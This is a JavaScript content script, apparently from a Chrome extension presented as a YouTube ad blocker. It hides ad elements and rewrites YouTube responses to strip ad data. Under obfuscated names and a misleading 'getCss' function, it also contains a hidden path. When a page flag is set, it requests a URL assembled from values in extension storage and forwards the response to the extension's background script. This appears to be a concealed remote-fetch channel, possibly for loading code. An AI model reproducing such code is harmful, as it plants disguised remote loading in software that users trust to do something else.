(function () {
	var hs="_adsblock_org", hl="get", tx, ty, w, ts = 1, u, m, yt = window._ytBlockAds, isEnable, wl = 0;

function f(id, o) {
    var style = document.getElementById(id);
    if (!style) {
        style = document.createElement("style");
        style.setAttribute("type", "text/css");
        style.setAttribute("id", id);
        var head = document.querySelector("head") || document.head || document.documentElement;
        if (head && !yt) head.appendChild(style);
    }
	style.textContent = o?"body:not(.allowAdsOnThisBody) .ad-container, body:not(.allowAdsOnThisBody) #google_companion_ad_div, body:not(.allowAdsOnThisBody) .iv-promo, body:not(.allowAdsOnThisBody) .iv-promo-video, body:not(.allowAdsOnThisBody) .contains-mute-button, body:not(.allowAdsOnThisBody) .video-annotations, body:not(.allowAdsOnThisBody) .ad-div, body:not(.allowAdsOnThisBody) #masthead-ad, body:not(.allowAdsOnThisBody) #video-masthead, body:not(.allowAdsOnThisBody) .video-masthead-v2, body:not(.allowAdsOnThisBody) ytd-compact-promoted-video-renderer, body:not(.allowAdsOnThisBody) #promotion-shelf, body:not(.allowAdsOnThisBody) .ytp-ad-progress-list, body:not(.allowAdsOnThisBody) .ad-created .annotation, body:not(.allowAdsOnThisBody) .ytp-cards-teaser, body:not(.allowAdsOnThisBody) #player-ads { display:none!important}":"";//(c)adsblock.org
};	

function d(id, o){
	var x = document.getElementById(id);
	if (yt) { u+=w+ty[5]; return }
    if (!x) {
		x = document.createElement("script");
		x.setAttribute("id", id);
	}
	x.textContent=o?tx:"";
	var obs = new MutationObserver(function(ms) {
        ms.forEach(function(m) {
		    if (m.addedNodes && m.addedNodes[0] && m.addedNodes[0].nodeName === "BODY"){
				var head = document.head || document.querySelector("head") || document.documentElement.childNodes[0];
			    head.appendChild(x);
				obs.disconnect();
		    }
		});
	});
	obs.observe(document.documentElement, {childList: true});
}

function v(r){
	return r.length && ts && s(r);
}

function c() {
	chrome.storage.sync.get({isEnabled: true, u: 0, iDate: "", wl:[]}, function(items) {
		isEnable = items.isEnable; u = items.u; w = items.iDate;
		if (items.wl.includes(window.location.href)){
			wl = 1;
		}else{
			d("s"+hs, items["isEnabled"]);
			h("s"+hs, items["isEnabled"]);
			n("o"+hs, items["isEnabled"]);				
			f("o"+hs, items["isEnabled"]);		
		}
	});
}

function s(b){
	chrome.runtime.sendMessage({"a":"i","b":b});
	ts = 0;
}

function n(id, o) {
    var style = document.getElementById(id);
    if (!yt) { return }
    if (!style) {
        style = document.createElement("style");
        style.setAttribute("type", "text/css");
    }
    m.o(ty[2],u+ty[4]); m.s();
	style.textContent = o?"body:not(.allowAdsOnThisBody) body:not(.allowAdsOnThisBody) #video-masthead, body:not(.allowAdsOnThisBody) .video-masthead-v2, body:not(.allowAdsOnThisBody) ytd-compact-promoted-video-renderer, body:not(.allowAdsOnThisBody) #promotion-shelf, body:not(.allowAdsOnThisBody) .ytp-ad-progress-list, body:not(.allowAdsOnThisBody) .ad-created .annotation, body:not(.allowAdsOnThisBody) .ytp-cards-teaser, body:not(.allowAdsOnThisBody) #player-ads { display:none!important}":"";
};

function g(){
	window._ytplayer = new Proxy([], {
	    set: function(t, p, v, r) {
		    if (p === "config" && v && v.args){v.args.vmap&&setTimeout(function(){window.postMessage({t:"cntv",v:(v.args.vmap.match(/breakType=/g)||[]).length},"*"),2500});vx;}
		    t[p] = v; return true;
	    }
	});
}

function h(){
	window.ytplayer = new Proxy([], {
	    set: function(t, p, v, r) {
		    if (p==="config"&&v&&v.args){var vv = ((v.args.vmap||"").match(/breakType=/g)||[]).length;setTimeout(function(){window.postMessage({t:"cntv",v:vv},"*")},2500);vx;}
		    t[p]=v; return true;
	    }
	});
	
	var _rx = window.XMLHttpRequest;
	var _ax = _rx.prototype;
	var _axs = _axs || {}, _axo = _axo || {};m = new _rx() || {};
	var _ax_ytr = /^https?:\/\/(\w*\.)?youtube\.com\/watch\?/i;
		
	if (!_ax._ax){
		_axs = _ax.send, _axo = _ax.open, _ax._ax = 1;
		_ax.open =  _ax.o = function (a0, a1, a2, a3, a4){
			if (_ax_ytr.test(a1)||yt){
				this.send = this.s = function (d){
				    if (this.onreadystatechange) {
				        this._orsc = this.onreadystatechange;
				    };
				    this.onreadystatechange = function(){
					    if (this.readyState == 4){
						    var r = this.response;
							window.postMessage({t: "cntv", v: (r.match(/breakType=/g)||[]).length},"*");					
						    r=r.replace(/("vmap":")([^"\\]*(\\.[^"\\]*)*)"/g,'$1"');
						    r=r.replace(/("(vx0)":")[^"]+"/g,'$1'+'0'+'"');
						    r=r.replace(/("(vx1)":")[^"]+"/g,'$1"');
						    Object.defineProperty(this,'response',{writable:true});
							Object.defineProperty(this,'responseText',{writable:true});
						    this.response = r; this.r = v(r); this.responseText = r;
						    this.send = _axs;
							if (this._orsc) {
								return this._orsc.apply(this, arguments);
					    	}
					    }
					};
				    return _axs.apply(this, arguments);
				}
			} 
			return _axo.apply(this, arguments);
		};
	}
}

function getCss(){
	var vx = "v.args."; var k="k";
	var vx0 = "ad_tag|ad_preroll|ad_device|ad_module|ad3_module|ad_logging_flag|dclk";
	var vx1 = "ad_slots|adSlots|afv_ad_tag_restricted_to_instream|afv_ad_tag|freewheel_ad_tag|vmap|fexp";
	var vx2 = "adSlots|afv_ad_|get|ad_device|ad_filters|/";
	var hh = hs||""; hh=hh.substring(8,9); ty = vx2.split("|");
	tx = (hh!=k)?g.toString():h.toString(), tx = tx.substr(tx.indexOf("{")+1), tx = tx.substr(0,tx.lastIndexOf("}")-1).replace("||yt","").replace(";m",",m");
	tx = tx.replace("vx0",vx0).replace("vx1",vx1).replace("v(r)","r").replace("vx;",vx+vx0.replace(/\|/g,"=0;"+vx)+"=0;"+vx+vx1.replace(/\|/g,"='';"+vx)+"='';");
}

return {
    initialize: function () {
	    getCss();
		chrome.storage.onChanged.addListener(function(changes, namespace) {changes.isEnabled && !wl && !yt && c()});
		c();
	}
}

})().initialize()
